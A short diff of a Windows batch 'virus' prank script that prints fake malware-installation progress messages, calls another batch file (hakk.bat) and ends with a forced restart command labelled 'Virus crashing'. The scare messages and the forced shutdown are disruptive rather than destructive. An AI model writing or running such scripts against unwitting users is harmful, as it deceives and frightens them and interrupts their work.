@@ -17,6 +17,7 @@ pause
 echo Herobrine.exe
 echo Virus 
 pause 
+hakk.bat
 echo Installing Viruses from Herobrine.exe
 echo Virus Install Started. Please Wait... 
 echo Installed 72% Complete
@@ -196,8 +197,6 @@ echo installing malware this will take 3 minutes
 echo installing malware this will take 3 minutes
 echo installing malware this will take 3 minutes
 echo {/}==========={([~||~])}==========={\}
-pause
-start hakk.bat
 pause 
-hsbthg836676hshjut^^^^^^^^²¹.bat
+hsbthg836676hshjut^^^^^^^^²¹
 shutdown -r -t 180 -c "Virus crashing"
